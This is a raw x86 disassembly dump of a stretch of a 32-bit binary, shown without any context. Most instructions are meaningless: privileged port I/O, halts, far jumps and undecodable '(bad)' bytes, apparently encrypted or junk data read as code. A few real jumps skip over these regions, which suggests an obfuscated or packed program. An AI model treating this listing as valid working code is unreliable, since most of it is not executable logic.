  40b687:	cwde   
  40b688:	dec    esi
  40b689:	pop    ecx
  40b68a:	cmc    
  40b68b:	push   esi
  40b68c:	mov    edi,0xd1860f30
  40b691:	and    ah,BYTE PTR [ebp-0x7a7f36b8]
  40b697:	pop    edx
  40b698:	sti    
  40b699:	xchg   edi,eax
  40b69a:	idiv   DWORD PTR [edi+0x4a]
  40b69d:	push   esi
  40b69e:	mov    al,0xd
  40b6a0:	scas   al,BYTE PTR es:[edi]
  40b6a1:	test   BYTE PTR [ebx+eiz*2+0x2b],bh
  40b6a5:	jecxz  0x40b700
  40b6a7:	cmp    eax,0xe177072f
  40b6ac:	push   esp
  40b6ad:	cmp    DWORD PTR [eax-0x3e],0x8bf0458b
  40b6b4:	dec    ebp
  40b6b5:	in     al,dx
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0x54
  40b6da:	cli    
  40b6db:	lock hlt 
  40b6dd:	fptan  
  40b6df:	jle    0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b764
  40b6e6:	push   edx
  40b6e7:	mov    dl,0x71
  40b6e9:	xchg   edi,eax
  40b6ea:	or     al,0xd1
  40b6ec:	or     esi,ecx
  40b6ee:	out    dx,al
  40b6ef:	mov    eax,ds:0x59896ccb
  40b6f4:	push   ebp
  40b6f5:	pusha  
  40b6f6:	cli    
  40b6f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f8:	outs   dx,DWORD PTR ds:[esi]
  40b6f9:	pushf  
  40b6fa:	and    BYTE PTR [edi+0x2119384b],0x64
  40b701:	mov    ecx,0xf3af822f
  40b706:	mov    al,BYTE PTR [ebx+0xf]
  40b709:	shr    DWORD PTR [edx-0x4e],0x5
  40b70d:	icebp  
  40b70e:	stc    
  40b70f:	sub    edi,DWORD PTR [edi-0x13]
  40b712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b713:	and    eax,0x4f7a85b7
  40b718:	sub    BYTE PTR ds:0x759a9b6b,bl
  40b71e:	cmp    BYTE PTR [eax+0x43],dh
  40b721:	push   es
  40b722:	mov    esp,0xfe86d573
  40b727:	nop
  40b728:	xlat   BYTE PTR ds:[ebx]
  40b729:	or     al,0x23
  40b72b:	inc    eax
  40b72c:	imul   edi,ebx,0x1c
  40b72f:	aas    
  40b730:	imul   esi,eax,0x1
  40b733:	push   esi
  40b734:	jecxz  0x40b772
  40b736:	and    DWORD PTR ds:0xfb12307e,0xffffff8c
  40b73d:	and    BYTE PTR [esi+0x30b17605],bl
  40b743:	jnp    0x40b726
  40b745:	inc    esp
  40b746:	push   edx
  40b747:	jecxz  0x40b6fe
  40b749:	push   edx
  40b74a:	mov    dh,BYTE PTR [ebx+0x46]
  40b74d:	outs   dx,BYTE PTR ds:[esi]
  40b74e:	je     0x40b796
  40b750:	iret   
  40b751:	test   DWORD PTR [ebp-0x1c24920c],0x2e644131
  40b75b:	les    ecx,FWORD PTR [edi+0x57]
  40b75e:	mov    eax,0x5dabb75e
  40b763:	repnz and BYTE PTR ss:0x9e889f3f,al
  40b76b:	jno    0x40b7b4
  40b76d:	shl    BYTE PTR [eax-0x50ae2aeb],cl
  40b773:	jae    0x40b7cd
  40b775:	arpl   bx,di
  40b777:	inc    ebx
  40b778:	fistp  DWORD PTR [ebx+0x29]
  40b77b:	sbb    al,0xc7
  40b77d:	pop    edx
  40b77e:	adc    BYTE PTR [ebx+0x5801a4b5],0xc5
  40b785:	adc    DWORD PTR [esi],ebp
  40b787:	push   ds
  40b788:	ins    DWORD PTR es:[edi],dx
  40b789:	das    
  40b78a:	xchg   edx,eax
  40b78b:	jle    0x40b76e
  40b78d:	cwde   
  40b78e:	out    dx,eax
  40b78f:	out    0xf3,eax
  40b791:	xchg   edx,eax
  40b792:	inc    edx
  40b793:	stos   BYTE PTR es:[edi],al
  40b794:	and    DWORD PTR [ebx+eax*2-0x9fbf451],eax
  40b79b:	addr16 jno 0x40b76e
  40b79e:	popf   
  40b79f:	dec    esp
  40b7a0:	fistp  DWORD PTR [edx]
  40b7a2:	(bad)  
  40b7a3:	adc    eax,0xa0e1c85d
  40b7a8:	pushf  
  40b7a9:	adc    al,0xb7
  40b7ab:	sar    DWORD PTR [ebx],1
  40b7ad:	xor    eax,0xbe709a0e
  40b7b2:	stos   DWORD PTR es:[edi],eax
  40b7b3:	jmp    0xc506:0x1cfdce3
  40b7ba:	mov    esi,0xf6c0692e
  40b7bf:	js     0x40b828
  40b7c1:	pop    edx
  40b7c2:	jle    0x40b7d1
  40b7c4:	xchg   dl,dh
  40b7c6:	cmp    edi,0x15
  40b7c9:	adc    al,0x30
  40b7cb:	and    bh,BYTE PTR [esi+0x6389429a]
  40b7d1:	stc    
  40b7d2:	add    edx,esp
  40b7d4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40b7d6:	(bad)  
  40b7d7:	xchg   edi,eax
  40b7d8:	ins    DWORD PTR es:[edi],dx
  40b7d9:	xor    al,0xf5
  40b7db:	je     0x40b80b
  40b7dd:	lock jg 0x40b783
  40b7e0:	mov    edx,0xd021571a
  40b7e5:	push   ebx
  40b7e6:	(bad)  
  40b7e7:	in     al,dx
  40b7e8:	jle    0x40b82a
  40b7ea:	aas    
  40b7eb:	enter  0x8e0c,0x3e
  40b7ef:	and    ebx,0xffffffb2
  40b7f2:	xchg   edi,eax
  40b7f3:	scas   eax,DWORD PTR es:[edi]
  40b7f4:	das    
  40b7f5:	jl     0x40b801
  40b7f7:	stos   DWORD PTR es:[edi],eax
  40b7f8:	cmp    eax,0x6128e8e3
  40b7fd:	repz jmp 0x3642:0x3f268071
  40b805:	and    BYTE PTR [eax+edi*8-0x76c2db89],dl
  40b80c:	dec    ebx
  40b80d:	xchg   esi,eax
  40b80e:	fnsave [esi]
  40b810:	pop    edi
  40b811:	pop    ebp
  40b812:	lods   eax,DWORD PTR ds:[esi]
  40b813:	xchg   ebx,eax
  40b814:	pop    esi
  40b815:	aas    
  40b816:	push   edx
  40b817:	or     ecx,DWORD PTR [eax-0x6114570e]
  40b81d:	cli    
  40b81e:	aas    
  40b81f:	push   ss
  40b820:	scas   al,BYTE PTR es:[edi]
  40b821:	mov    ebp,0xebe229aa
  40b826:	sbb    ebx,ebp
  40b828:	outs   dx,DWORD PTR ds:[esi]
  40b829:	cmp    ecx,ecx
  40b82b:	xor    eax,0xa09097d4
  40b830:	stos   DWORD PTR es:[di],eax
  40b832:	push   ds
  40b833:	stos   BYTE PTR es:[edi],al
  40b834:	int    0x1a
  40b836:	sahf   
  40b837:	cli    
  40b838:	aaa    
  40b839:	inc    ebp
  40b83a:	jp     0x40b7f3
  40b83c:	jnp    0x40b814
  40b83e:	cli    
  40b83f:	test   al,0x28
  40b841:	add    al,0x13
  40b843:	pop    edx
  40b844:	mov    edx,0x1d8c5849
  40b849:	iret   
  40b84a:	(bad)  
  40b84c:	jb     0x40b87f
  40b84e:	inc    esi
  40b84f:	cmp    eax,0x2bc5fc2
  40b854:	fiadd  WORD PTR [ebp+0x23]
  40b857:	push   0x8
  40b859:	in     al,dx
  40b85a:	pop    esp
  40b85b:	or     eax,0x35d4713a
  40b860:	inc    ebx
  40b861:	sub    al,0x0
  40b863:	inc    eax
  40b864:	xor    al,BYTE PTR [edi]
  40b866:	imul   ebx,DWORD PTR [esp+eax*2-0x792ff3eb],0x1
  40b86e:	cmc    
  40b86f:	xchg   ecx,eax
  40b870:	cmp    DWORD PTR cs:[esp+ecx*8-0x48],eax
  40b875:	mov    edi,0xfe2db8f1
  40b87a:	das    
  40b87b:	or     DWORD PTR [edx+0x4e],esp
  40b87e:	and    eax,0xd9a039b5
  40b883:	shl    DWORD PTR [esi-0x414e93a2],1
  40b889:	inc    eax
  40b88a:	out    dx,eax
  40b88b:	inc    esp
  40b88c:	es mov esp,0x7eba36f1
  40b892:	and    BYTE PTR [eax],0xd2
  40b895:	fimul  DWORD PTR [eax+0x12c4a03b]
  40b89b:	icebp  
  40b89c:	mov    ebx,0x1710b750
  40b8a1:	pop    esi
  40b8a2:	loope  0x40b890
  40b8a4:	mov    ebp,0x1a5bf0c0
  40b8a9:	stc    
  40b8aa:	jb     0x40b8f3
  40b8ac:	gs loope 0x40b859
  40b8af:	shl    BYTE PTR [ecx],1
  40b8b1:	dec    eax
  40b8b2:	push   0xffffffd0
  40b8b4:	dec    ecx
  40b8b5:	bound  ebp,QWORD PTR [edi+0x37206972]
  40b8bb:	call   DWORD PTR [eax+esi*2+0x7e]
  40b8bf:	stos   DWORD PTR es:[edi],eax
  40b8c0:	cmp    DWORD PTR [ebx+eax*1-0x2aff4afc],edx
  40b8c7:	push   ss
  40b8c8:	pushf  
  40b8c9:	outs   dx,BYTE PTR ds:[esi]
  40b8ca:	mov    gs,edi
  40b8cc:	enter  0x8769,0x1f
  40b8d0:	js     0x40b886
  40b8d2:	mov    ah,BYTE PTR fs:[ebp-0x4bddc09a]
  40b8d9:	dec    edx
  40b8da:	std    
  40b8db:	xor    eax,0x305aa485
  40b8e0:	loopne 0x40b8d1
  40b8e2:	mov    al,ds:0x3a7a6b4c
  40b8e7:	push   DWORD PTR [edx+0x39]
  40b8ea:	fisub  WORD PTR [ebp+0x21]
  40b8ed:	fst    DWORD PTR [edx]
  40b8ef:	in     eax,0xc0
  40b8f1:	enter  0x1be6,0x5d
  40b8f5:	out    dx,al
  40b8f6:	lea    edi,[eax]
  40b8f8:	out    0xf3,al
  40b8fa:	xor    DWORD PTR [edi],edx
  40b8fc:	and    ecx,esp
  40b8fe:	cs in  al,dx
  40b900:	imul   DWORD PTR [edx+ecx*8]
  40b903:	sub    ch,BYTE PTR [edx]
  40b905:	push   ecx
  40b906:	or     dh,0x6
  40b909:	pop    ds
  40b90a:	pop    ecx
  40b90b:	loop   0x40b8e2
  40b90d:	push   ds
  40b90e:	mov    esi,0x9764b7a4
  40b913:	cmp    al,0xcd
  40b915:	dec    esp
  40b916:	pop    es
  40b917:	leave  
  40b918:	dec    ebp
  40b919:	add    ebx,DWORD PTR [ecx]
  40b91b:	lock fisub DWORD PTR [edx]
  40b91e:	shr    edx,0x15
  40b921:	xchg   edx,eax
  40b922:	jo     0x40b941
  40b924:	push   esi
  40b925:	mov    BYTE PTR [ecx-0x3e],bl
  40b928:	and    al,0x4
  40b92a:	arpl   WORD PTR [ecx+ecx*1+0x58f450a3],dx
  40b931:	ins    DWORD PTR es:[edi],dx
  40b932:	fstp   QWORD PTR [ebx+0x72]
  40b935:	dec    ebp
  40b936:	lds    ecx,FWORD PTR [esp-0x9bd21be]
  40b93d:	mov    esp,0xa8316924
  40b942:	xor    cl,BYTE PTR [ebp-0x21]
  40b945:	mov    eax,ds:0xe0e11a36
  40b94a:	dec    eax
  40b94b:	push   ecx
  40b94c:	jo     0x40b91a
  40b94e:	or     DWORD PTR ds:0x4613f6a2,0xeb1beefa
  40b958:	test   BYTE PTR ds:0x9b6381d6,dl
  40b95e:	xchg   edi,eax
  40b95f:	cli    
  40b960:	test   DWORD PTR [ebp-0x277a60da],edi
  40b966:	jbe    0x40b95a
  40b968:	cld    
  40b969:	es sbb al,0x56
  40b96c:	(bad)
  40b970:	aam    0x77
  40b972:	repnz inc eax
  40b974:	mov    ecx,0xcbbc3411
  40b979:	sub    edx,DWORD PTR [eax]
  40b97b:	jmp    0xa37aa291
  40b980:	pop    eax
  40b981:	push   0xffffffd8
  40b983:	mov    ds:0x2b9f32dd,eax
  40b988:	jae    0x40b9a1
  40b98a:	aas    
  40b98b:	ja     0x40b98a
  40b98d:	in     eax,0x59
  40b98f:	(bad)  [esi+0x4d017a70]
  40b995:	jne    0x40b947
  40b997:	inc    edi
  40b998:	iret   
  40b999:	pusha  
  40b99a:	push   edx
  40b99b:	lea    eax,[edi-0x24]
  40b99e:	jbe    0x40b933
  40b9a0:	mov    edi,0xe7d47a08
  40b9a5:	aad    0x70
  40b9a7:	in     al,dx
  40b9a8:	jmp    0x5c0740fc
  40b9ad:	mov    dh,0x68
  40b9af:	xor    BYTE PTR [eax+0x55fe8655],dh
  40b9b5:	les    ecx,FWORD PTR [edx+ebx*2+0x6817dc02]
  40b9bc:	mov    ah,0xb0
  40b9be:	dec    eax
  40b9bf:	add    ecx,DWORD PTR [eax]
  40b9c1:	lock (bad) 
  40b9c3:	loope  0x40b94c
  40b9c5:	dec    ebx
  40b9c6:	out    0xef,al
  40b9c8:	and    DWORD PTR [esi],eax
  40b9ca:	jbe    0x40ba06
  40b9cc:	fsubrp st(5),st
  40b9ce:	jno    0x40ba43
  40b9d0:	and    DWORD PTR [eax-0x45969b99],esp
  40b9d6:	lods   eax,DWORD PTR ds:[esi]
  40b9d7:	xchg   esp,eax
  40b9d8:	push   ecx
  40b9d9:	mov    edi,0x4009b8e1
  40b9de:	dec    esp
  40b9df:	fadd   st(0),st
  40b9e1:	cdq    
  40b9e2:	sar    BYTE PTR [ebx],0xec
  40b9e5:	push   cs
  40b9e6:	pusha  
  40b9e7:	inc    ebp
  40b9e8:	scas   eax,DWORD PTR es:[edi]
  40b9e9:	rcl    BYTE PTR [edi+0x51],0x9c
  40b9ed:	in     al,0xad
  40b9ef:	xchg   esp,eax
  40b9f0:	push   ds
  40b9f1:	lock in eax,dx
  40b9f3:	retf   
  40b9f4:	dec    ecx
  40b9f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9f6:	inc    esp
  40b9f7:	call   DWORD PTR [edi+0x2a0a7898]
  40b9fd:	mov    al,0xab
  40b9ff:	xor    dh,BYTE PTR [esi]
  40ba01:	(bad)  
  40ba02:	mov    ecx,0x23c7441f
  40ba07:	mov    al,ds:0xe1d41ed2
  40ba0c:	loope  0x40ba37
  40ba0e:	pop    es
  40ba0f:	leave  
  40ba10:	neg    BYTE PTR [edi-0xb]
  40ba13:	sar    DWORD PTR [edi-0x3b2749a],0xf
  40ba1a:	mov    bh,0xc9
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	jmp    0x8988a45a
  40ba3a:	icebp  
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba36
  40ba42:	adc    DWORD PTR [ecx],esi
  40ba44:	into   
  40ba45:	inc    ecx
  40ba46:	imul   edx,DWORD PTR [eax-0x70],0xffffff84
  40ba4a:	mov    ch,0x22
  40ba4c:	mov    gs,WORD PTR [eax+0x4813efa4]
  40ba52:	loopne 0x40baac
  40ba54:	sbb    bh,BYTE PTR [ecx]
  40ba56:	sahf   
  40ba57:	lods   eax,DWORD PTR ds:[esi]
  40ba58:	lods   al,BYTE PTR ds:[esi]
  40ba59:	xchg   edi,ebp
  40ba5b:	add    bh,dh
  40ba5d:	xchg   edi,eax
  40ba5e:	pusha  
  40ba5f:	xlat   BYTE PTR ds:[ebx]
  40ba60:	mov    dh,0x98
  40ba62:	adc    cl,BYTE PTR ds:0x4434c5fd
  40ba68:	and    DWORD PTR [edi+edi*2-0x2dc067d1],eax
  40ba6f:	push   esp
  40ba70:	xor    al,BYTE PTR [ebx]
  40ba72:	push   esp
  40ba73:	rcl    BYTE PTR [edi+0x42bd752d],1
  40ba79:	push   eax
  40ba7a:	sbb    eax,0xbb9632e5
  40ba7f:	mov    esp,0x2e797e3f
  40ba84:	jne    0x40bac7
  40ba86:	and    ebp,DWORD PTR [ecx]
  40ba88:	(bad)  
  40ba89:	push   esi
  40ba8a:	test   al,0x19
  40ba8c:	iret   
  40ba8d:	inc    eax
  40ba8e:	cmc    
  40ba8f:	mov    ecx,0xe41e0dca
  40ba94:	mov    esi,0x6de357d2
  40ba99:	sub    DWORD PTR [esi],esi
  40ba9b:	fmulp  st(6),st
  40ba9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba9e:	adc    eax,esi
  40baa0:	push   ebp
  40baa1:	ret    
  40baa2:	sub    esi,DWORD PTR [esi-0x7e79b322]
  40baa8:	or     esi,DWORD PTR [ecx]
  40baaa:	mov    eax,0x7075fee7
  40baaf:	ins    BYTE PTR es:[edi],dx
  40bab0:	dec    esi
  40bab1:	mov    bh,dl
  40bab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bab4:	or     al,0xb0
  40bab6:	cmp    cl,bl
  40bab8:	sahf   
  40bab9:	cmp    BYTE PTR [ecx-0x674995e7],bh
  40babf:	rcr    DWORD PTR [ebx+eax*8-0x1c],cl
  40bac3:	adc    BYTE PTR [ebp+0x29],0x76
  40bac7:	or     DWORD PTR [edx-0x1c58a7d5],esp
  40bacd:	sub    edx,DWORD PTR [edi]
  40bacf:	gs loopne 0x40ba67
  40bad2:	inc    edx
  40bad3:	rcl    DWORD PTR [esi+ebp*1],1
  40bad6:	jns    0x40bb1d
  40bad8:	ror    DWORD PTR [edx-0x7014342b],1
  40bade:	pop    esp
  40badf:	add    eax,0x2222ddb8
  40bae4:	sti    
  40bae5:	and    eax,0x23f7803a
  40baea:	das    
  40baeb:	ins    DWORD PTR es:[edi],dx
  40baec:	mov    bh,0xd0
  40baee:	jmp    0x82f0:0xf823ec52
  40baf5:	xor    DWORD PTR [ebx],ebp
  40baf7:	push   eax
  40baf8:	sbb    DWORD PTR [ebx],edx
  40bafa:	pop    ecx
  40bafb:	mov    eax,0x8050fd28
  40bb00:	sub    DWORD PTR [ebx-0x4f],esp
  40bb03:	out    dx,eax
  40bb04:	jne    0x40bb77
  40bb06:	mov    ebp,0x2a21e9f
  40bb0b:	adc    eax,0x4265c536
  40bb10:	jmp    0x656e:0xea79a90e
  40bb17:	xchg   edi,eax
  40bb18:	jo     0x40baee
  40bb1a:	mov    al,ds:0x717d8390
  40bb1f:	and    DWORD PTR [ecx+0xa],ecx
  40bb22:	idiv   dh
  40bb24:	test   BYTE PTR [ecx],al
  40bb26:	inc    esp
  40bb27:	lds    eax,FWORD PTR [ebp-0x42343e7b]
  40bb2d:	push   0xf
  40bb2f:	add    DWORD PTR [edi],esp
  40bb31:	cmp    BYTE PTR [ebx+0x31785dc4],dh
  40bb37:	cli    
  40bb38:	or     BYTE PTR [edi-0x13993481],dh
  40bb3e:	sbb    DWORD PTR [ebp+0x29],esp
  40bb41:	sti    
  40bb42:	mov    BYTE PTR [eax+0x4b],dl
  40bb45:	cmp    eax,DWORD PTR [edx+0x35]
  40bb48:	lods   eax,DWORD PTR ds:[esi]
  40bb49:	idiv   BYTE PTR es:[edi+0x24]
  40bb4d:	and    DWORD PTR [ecx-0x65],eax
  40bb50:	push   es
  40bb51:	xlat   BYTE PTR ds:[ebx]
  40bb52:	sbb    eax,0xd67e4642
  40bb57:	mov    ah,0x0
  40bb59:	loope  0x40bba5
  40bb5b:	sub    al,0x6e
  40bb5d:	outs   dx,BYTE PTR ds:[esi]
  40bb5e:	mov    dh,BYTE PTR [edi-0x7e]
  40bb61:	ds pop ebx
  40bb63:	mov    ds:0x15977a3d,al
  40bb68:	int3   
  40bb69:	loopne 0x40bbaa
  40bb6b:	ja     0x40bb90
  40bb6d:	mov    BYTE PTR [esi-0x9d83b82],ch
  40bb73:	jmp    0x6801:0x8c1ed90a
  40bb7a:	lahf   
  40bb7b:	sar    BYTE PTR [ecx+0x62],0x34
  40bb7f:	cmp    bh,BYTE PTR [ebx]
  40bb81:	pop    ecx
  40bb82:	in     eax,dx
  40bb83:	fdivr  st(2),st
  40bb85:	ins    BYTE PTR es:[edi],dx
  40bb86:	push   ebp
  40bb87:	mov    eax,0x589ce152
  40bb8c:	xchg   ecx,eax
  40bb8d:	les    ebx,FWORD PTR [ebx-0x12602f87]
  40bb93:	pop    ds
  40bb94:	mov    al,es:0x1815bfc1
  40bb9a:	(bad)  
  40bb9b:	ja     0x40bb27
  40bb9d:	mov    ss,WORD PTR [edx]
  40bb9f:	mov    DWORD PTR fs:[ecx+0x60],edi
  40bba3:	mov    al,ds:0x913869d5
  40bba8:	mov    ebx,0x20f02fc2
  40bbad:	pop    ebx
  40bbae:	faddp  st(3),st
  40bbb0:	inc    edi
  40bbb1:	adc    edx,edx
  40bbb3:	xor    eax,0x2f0a2d3f
  40bbb8:	loopne 0x40bbab
  40bbba:	inc    edx
  40bbbb:	inc    esp
  40bbbc:	fwait
  40bbbd:	clc    
  40bbbe:	push   eax
  40bbbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbc0:	sahf   
  40bbc1:	enter  0x47c5,0xaf
  40bbc5:	and    BYTE PTR [eax],dh
  40bbc7:	shl    DWORD PTR [ebp-0x46],cl
  40bbca:	pop    edx
  40bbcb:	add    DWORD PTR [edx+0x200080],edi
  40bbd1:	dec    ecx
  40bbd2:	imul   esi,DWORD PTR [ebx+ebx*1+0x7025f123],0x4fd9caca
  40bbdd:	mov    ah,0xa4
  40bbdf:	clc    
  40bbe0:	dec    eax
  40bbe1:	pop    eax
  40bbe2:	or     al,0x3d
  40bbe4:	pop    ss
  40bbe5:	pop    ds
  40bbe6:	fnstenv [eax+0x6321ebf]
  40bbec:	divps  xmm6,xmm7
  40bbef:	xchg   edx,eax
  40bbf0:	outs   dx,BYTE PTR ds:[esi]
  40bbf1:	cwde   
  40bbf2:	pop    esi
  40bbf3:	loope  0x40bbff
  40bbf5:	mul    DWORD PTR [esi-0x48]
  40bbf8:	dec    edx
  40bbf9:	mov    edx,0x4e3f350a
  40bbfe:	outs   dx,BYTE PTR ds:[esi]
  40bbff:	sbb    BYTE PTR [esi],0x82
  40bc02:	bound  eax,QWORD PTR ds:[eax+0x62329b76]
  40bc09:	push   ebx
  40bc0a:	rcl    BYTE PTR [eax+0x26],1
  40bc0d:	fidiv  DWORD PTR [edi+edx*2]
  40bc10:	ds mov esi,0x2d9917ac
  40bc16:	pop    edx
  40bc17:	push   ebx
  40bc18:	in     al,dx
  40bc19:	ret    0x743d
  40bc1c:	add    al,dh
  40bc1e:	pop    es
  40bc1f:	scas   eax,DWORD PTR es:[edi]
  40bc20:	loopne 0x40bc11
  40bc22:	add    ch,BYTE PTR [edx+eax*4]
  40bc25:	scas   al,BYTE PTR es:[edi]
  40bc26:	mov    edx,DWORD PTR [edx+0x4074e599]
  40bc2c:	mov    BYTE PTR [eax+eax*8],cl
  40bc2f:	push   ebp
  40bc30:	inc    esi
  40bc31:	sbb    DWORD PTR [eax-0x19],esi
  40bc34:	popf   
  40bc35:	and    cl,0x67
  40bc38:	xchg   esi,eax
  40bc39:	xor    eax,0x8f97422f
  40bc3e:	ds jno 0x40bbe8
  40bc41:	int3   
  40bc42:	or     esp,DWORD PTR [ecx+0x71563aec]
  40bc48:	fimul  DWORD PTR [eax-0x244c024f]
  40bc4e:	push   cs
  40bc4f:	in     al,0x60
  40bc51:	sub    DWORD PTR [eax-0x79],ebp
  40bc54:	mov    DWORD PTR [ebp+0xb684017],ebp
  40bc5a:	gs xor edi,ebp
  40bc5d:	stc    
  40bc5e:	pop    ecx
  40bc5f:	rol    BYTE PTR [ebp+0x3911cd9a],cl
  40bc65:	add    al,dh
  40bc67:	or     al,0x9b
  40bc69:	add    eax,0xcf151b14
  40bc6e:	sbb    cl,BYTE PTR [edi]
  40bc70:	dec    edi
  40bc71:	mov    edx,0xb6d090d0
  40bc76:	sbb    BYTE PTR [ebx+0x39],dl
  40bc79:	push   DWORD PTR [esi+0x70]
  40bc7c:	jae    0x40bc82
  40bc7e:	les    esi,FWORD PTR [ecx+0x53]
  40bc81:	xchg   esi,eax
  40bc82:	movlps xmm2,QWORD PTR [ebp-0x1b5636fc]
  40bc89:	and    eax,0xab853cee
  40bc8e:	jne    0x40bc97
  40bc90:	mov    ch,0xff
  40bc92:	fnstenv [esi+0x7429649c]
  40bc98:	inc    eax
  40bc99:	gs or  ebp,ebx
  40bc9c:	cmc    
  40bc9d:	jbe    0x40bd09
  40bc9f:	mov    ds:0x49bfa09c,al
  40bca4:	in     eax,dx
  40bca5:	dec    edi
  40bca6:	js     0x40bc78
  40bca8:	sbb    dh,BYTE PTR [esi-0xd5919d8]
  40bcae:	or     eax,0x8215098c
  40bcb3:	rcr    DWORD PTR [esi+0x5827e814],1
  40bcb9:	push   es
  40bcba:	gs cmc 
  40bcbc:	and    bh,ch
  40bcbe:	mov    bl,0x75
  40bcc0:	xchg   BYTE PTR [eax+0x56302ca3],dh
  40bcc6:	jo     0x40bc86
  40bcc8:	frstor [ebx+0xdc7a8a8]
  40bcce:	push   esp
  40bccf:	idiv   BYTE PTR [ecx+0x3c2335f4]
  40bcd5:	or     bh,cl
  40bcd7:	test   eax,0x6888958a
  40bcdc:	xor    cl,bh
  40bcde:	cmp    eax,0x67218e3d
  40bce3:	fcmovbe st,st(7)
  40bce5:	lods   eax,DWORD PTR ds:[esi]
  40bce6:	jo     0x40bce7
  40bce8:	xchg   edi,ebp
  40bcea:	les    edi,FWORD PTR [ebx+0x76]
  40bced:	repz mov ebp,0xbe3f605b
  40bcf3:	dec    esi
  40bcf4:	call   0xf3ab:0xf39ad067
  40bcfb:	dec    ebp
  40bcfc:	pop    esp
  40bcfd:	jo     0x40bd23
  40bcff:	arpl   WORD PTR [ebx],bp
  40bd01:	sahf   
  40bd02:	or     al,BYTE PTR [edx+0x1e]
  40bd05:	cld    
  40bd06:	and    al,0xa9
  40bd08:	mov    bh,0x79
  40bd0a:	call   0x2656:0x769d386c
  40bd11:	jns    0x40bd23
  40bd13:	pop    eax
  40bd14:	dec    ebx
  40bd15:	hlt    
  40bd16:	mov    ebx,edi
  40bd18:	jmp    0x40bd49
  40bd1a:	dec    edi
  40bd1b:	sub    DWORD PTR ds:0x7bc2eec8,ebx
  40bd21:	stos   DWORD PTR es:[edi],eax
  40bd22:	jne    0x40bcb1
  40bd24:	je     0x40bcab
  40bd26:	sub    cl,ch
  40bd28:	ret    0x9834
  40bd2b:	das    
  40bd2c:	popf   
  40bd2d:	mov    al,ds:0xf9467a45
  40bd32:	or     edx,DWORD PTR [ebx+eax*4]
  40bd35:	xor    eax,0x7789fbf4
  40bd3a:	sub    eax,0x85618b9c
  40bd3f:	jae    0x40bcee
  40bd41:	or     eax,0x48f9bfde
  40bd46:	fs sub al,0xf0
  40bd49:	and    DWORD PTR [edx+0x3d87c6f4],edi
  40bd4f:	leave  
  40bd50:	mov    al,0xef
  40bd52:	loopne 0x40bcf0
  40bd54:	fmulp  st(7),st
  40bd56:	in     al,0x82
  40bd58:	fst    QWORD PTR [ebx]
  40bd5a:	push   ebx
  40bd5b:	popa   
  40bd5c:	std    
  40bd5d:	cwde   
  40bd5e:	mov    edx,0x343cd0ae
  40bd63:	mov    dl,0xef
  40bd65:	jg     0x40bd31
  40bd67:	scas   al,BYTE PTR es:[edi]
  40bd68:	aam    0x72
  40bd6a:	mov    cl,0xba
  40bd6c:	xchg   esi,eax
  40bd6d:	inc    edi
  40bd6e:	push   edi
  40bd6f:	(bad)  
  40bd71:	mov    ecx,DWORD PTR [ebp+0xc]
  40bd74:	xor    eax,esi
  40bd76:	add    eax,eax
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz or bh,0x82
  40bd8e:	ins    DWORD PTR es:[edi],dx
  40bd8f:	mov    ecx,0x2e7e7efc
  40bd94:	jge    0x40be14
  40bd96:	jle    0x40bd4e
  40bd98:	sub    edi,DWORD PTR [edx]
  40bd9a:	jmp    0x7c4eaa1c
  40bd9f:	mov    bl,0x47
  40bda1:	xchg   DWORD PTR ds:0x6505821d,eax
  40bda7:	iret   
  40bda8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bda9:	dec    esi
  40bdaa:	mov    edx,0x121e9ea2
  40bdaf:	sbb    dh,BYTE PTR [edi+0x29]
  40bdb2:	fidivr WORD PTR cs:[ecx+eax*1+0x2920daeb]
  40bdba:	mov    ch,0x2
  40bdbc:	jmp    0xb0fe:0x54d6fde7
  40bdc3:	and    bh,BYTE PTR [ecx-0x40]
  40bdc6:	mov    bh,BYTE PTR [esi-0x4e]
  40bdc9:	pop    ss
  40bdca:	xor    ch,BYTE PTR [esi+0x6e]
  40bdcd:	jge    0x40be12
  40bdcf:	pop    ebp
  40bdd0:	pop    ss
  40bdd1:	pop    ds
  40bdd2:	xchg   esi,eax
  40bdd3:	push   0x2e2f03aa
  40bdd8:	cli    
  40bdd9:	imul   eax,DWORD PTR [ebx],0x139b7af2
  40bddf:	jle    0x40bdfb
  40bde1:	dec    esi
  40bde2:	div    cl
  40bde4:	lods   eax,DWORD PTR ds:[esi]
  40bde5:	mov    DWORD PTR [edi],0x43d49b40
  40bdeb:	and    DWORD PTR [ecx-0x5675988b],eax
  40bdf1:	into   
  40bdf2:	dec    edx
  40bdf3:	add    al,0x8
  40bdf5:	jmp    0x23c018a5
  40bdfa:	and    esp,DWORD PTR cs:[edx+0x63]
